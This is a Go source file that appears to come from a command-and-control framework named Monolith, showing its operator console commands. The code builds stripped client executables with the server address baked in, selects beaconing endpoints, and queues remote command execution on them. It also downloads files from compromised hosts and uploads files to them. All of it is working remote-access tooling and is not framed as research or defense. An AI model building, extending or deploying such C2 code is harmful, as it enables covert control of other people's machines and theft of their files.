package main

import (
	"fmt"
	"github.com/WesEfird/Monolith/cryptutil"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// DefaultMode Console commands

func (cons *Console) cmdEndpoint(args []string) {
	var err error
	if len(args) < 1 {
		fmt.Println("command usage: Endpoint <EndpointID>")
		return
	}
	// Update the Console's SelectedEndpoint to the Endpoint pointer relative to the EndpointID provided
	cons.SelectedEndpoint, err = cons.PServ.GetEndpointById(args[0])
	if err != nil {
		fmt.Printf("err: %s\n", err.Error())
		return
	}
	// Change the Console Mode
	LivePrefixState.ConMode = EndpointMode
}

func (cons *Console) cmdListEndpoints() {
	fmt.Println(cons.PServ.GetEndpointList())
}

func (cons *Console) cmdGenCert(args []string) {
	if len(args) < 1 {
		fmt.Println("command usage: GenCert <filename>")
		return
	}

	fmt.Println("generating certificate and key pair...")
	cryptutil.GenerateCerts(args[0])
}

func (cons *Console) cmdBuildEndpoint(args []string) {
	if len(args) < 4 {
		fmt.Println("command usage: BuildEndpoint <EndpointID> <Server IP> <Server Port> <Auth String>")
		return
	}

	var sourceDir, _ = os.Getwd()
	sourceDir = path.Join(sourceDir, "res/MonolithClient")
	var buildArgs = []string{
		"build",
		"-o",
		fmt.Sprintf("../../bin/%s", args[0]+".exe"),
		fmt.Sprintf("-ldflags=-s -w -X 'main.EndpointID=%s' -X 'main.IpAddr=%s' -X 'main.Port=%s' -X 'main.AuthString=%s'",
			args[0],
			args[1],
			args[2],
			args[3]),
		"."}
	buildProc := exec.Command("go", buildArgs...)
	buildProc.Dir = sourceDir
	allOut, err := buildProc.CombinedOutput()
	if err != nil {
		fmt.Printf("err: %s\n", err.Error())
		return
	}
	fmt.Printf("%s\n", string(allOut))
	fmt.Printf("successful build for: endpointid: %s, serverIp: %s, serverPort: %s, authString: %s\n",
		args[0], args[1], args[2], args[3])
	// Create new endpoint struct in memory
	e := NewEndpoint(cons.PServ, nil, args[0])
	// Set the AuthString as a hex representation of the sha-256 of the provided authString
	e.AuthString = cryptutil.StringToSha256Hex(args[3])
	// Save the endpoint to disk
	cons.PServ.Commands <- "SAVE"
}

// EndpointMode Console commands

func (cons *Console) cmdExec(args []string) {
	if len(args) < 1 {
		fmt.Println("command usage: Exec <command> [arguments]")
		return
	}
	if len(args) <= 2 {
		cons.SelectedEndpoint.BufferCommand("EXEC", args[0])
	} else {
		cons.SelectedEndpoint.BufferCommand("EXEC", args...)
	}
	// Clear buffer if it's not empty
	if len(cons.InterMsg) > 0 {
		<-cons.InterMsg
	}
	// Wait for response, timeout after the timeout threshold has passed
	select {
	case result := <-cons.InterMsg:
		fmt.Println(result)
	case <-time.After(time.Duration(cons.InterMsgTimeout) * time.Second):
		fmt.Println("command results not received within timeout threshold")
		fmt.Println("check 'log' later as the command may run next time the endpoint beacons")
	}
}

func (cons *Console) cmdSet(args []string) {
	if len(args) < 2 {
		fmt.Println("command usage: Set <option> <value>")
		return
	}
	switch strings.ToLower(args[0]) {
	case "beaconrate":
		if _, err := strconv.Atoi(args[1]); err != nil {
			fmt.Println("invalid value, must be a number representing seconds")
			return
		}
		cons.SelectedEndpoint.BufferCommand("SET", "BEACONRATE", args[1])
	default:
		fmt.Printf("option %s is not a valid option\n", args[0])
	}
}

// cmdDownload expects at least 1 argument, but can take two
//
// args[0] = remote file path of file to be downloaded
//
// optional: args[1] = local file path to determine where to ultimately write the file.
// If this argument is not provided, it will default to the 'downloads' folder that the server will create
func (cons *Console) cmdDownload(args []string) {
	var localDir string
	if len(args) < 1 {
		fmt.Println("command usage: Download <remote file path> [local file path]")
		return
	}
	if len(args) < 2 {
		if _, err := os.Stat("./downloads"); os.IsNotExist(err) {
			os.Mkdir("downloads", os.ModePerm)
		}
		localDir = "./downloads/" + filepath.Base(args[0])
		cons.SelectedEndpoint.AddFileQueue(args[0], localDir)
		cons.SelectedEndpoint.BufferCommand("DFILE", args[0])
		return
	}
	cons.SelectedEndpoint.AddFileQueue(args[0], args[1])
	cons.SelectedEndpoint.BufferCommand("DFILE", args[0])

}

//cmdUpload expects at least 1 argument, but can take two
// args[0] = local file path to file that will be uploaded
//
// optional: args[1] = remote file path to the location the file will be uploaded.
// If this argument is not provided, it will default to the current working directory of the Endpoint client.
func (cons *Console) cmdUpload(args []string) {
	remotePath := "./"
	if len(args) < 1 {
		fmt.Println("command usage: Upload <local file path> [remote file path]")
		return
	}
	if len(args) >= 2 {
		remotePath = args[1]
	}
	// Check if local file exists.
	if _, err := os.Stat(args[0]); os.IsNotExist(err) {
		fmt.Println("local file not found: ", err)
		return
	}
	fileName := filepath.Base(args[0])

	cons.SelectedEndpoint.AddUploadQueue(args[0])
	cons.SelectedEndpoint.BufferCommand("UFILE", fileName, remotePath)

}
